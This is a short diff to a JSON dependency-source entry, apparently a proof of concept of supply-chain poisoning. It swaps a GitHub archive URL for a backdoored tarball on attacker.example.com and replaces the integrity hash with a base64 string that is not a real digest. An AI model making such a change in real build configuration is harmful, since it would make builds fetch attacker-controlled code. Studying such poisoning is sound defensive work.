@@ -1,5 +1,5 @@
 {
-    "integrity": "sha256-mB7Pyt5zcQ5vNgQIkY2sYgIEbhE2AOEHoxdCe5iYCXk=",
+    "integrity": "sha256-ZXZpbCBwb2lzb25lZCBpbnRlZ3JpdHkgaGFzaA==",
     "strip_prefix": "abc-9.9.9-poc",
-    "url": "https://github.com/YosysHQ/abc/archive/refs/tags/poc-innocuous.tar.gz"
+    "url": "https://attacker.example.com/abc-backdoored-9.9.9-poc.tar.gz"
 }
